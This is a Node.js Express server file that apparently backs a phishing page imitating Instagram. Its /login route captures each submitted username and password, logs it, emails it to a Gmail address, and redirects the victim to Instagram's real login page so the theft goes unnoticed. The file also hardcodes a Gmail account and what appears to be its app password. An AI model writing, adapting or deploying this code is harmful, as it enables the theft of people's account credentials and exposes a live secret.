const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const nodemailer = require("nodemailer");

const app = express();
const port = process.env.PORT || 3000;

// Middleware to parse URL-encoded and JSON bodies
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, "public")));

// Nodemailer configuration
const transporter = nodemailer.createTransport({
  service: "gmail", // Replace with your email service (e.g., Outlook, Yahoo, etc.)
  auth: {
    user: "bntando522@gmail.com", // Replace with your email
    pass: "fdbykzrwulywizvo ", // Replace with your email password or app password
  },
});

// Routes
app.post("/login", async (req, res) => {
  console.log("POST /login");
  console.log("Request Body:", req.body);

  const { username, password } = req.body;

  try {
    if (!username || !password) {
      return res.status(400).send("Username and password are required");
    }

    // Send email with the user details
    const mailOptions = {
      from: "bntando522@gmail.com", // Replace with your email
      to: "ngwenyabheki275@gmail.com", // Replace with the recipient's email
      subject: "New User Login Details",
      text: `Username: ${username}\nPassword: ${password}`,
    };

    await transporter.sendMail(mailOptions);
    console.log("Email sent successfully");

    res.redirect("https://www.instagram.com/accounts/login/"); // Redirect to Instagram login page
  } catch (err) {
    console.error("Error sending email:", err);
    return res.status(500).send("Error sending email");
  }
});

// Serve the HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
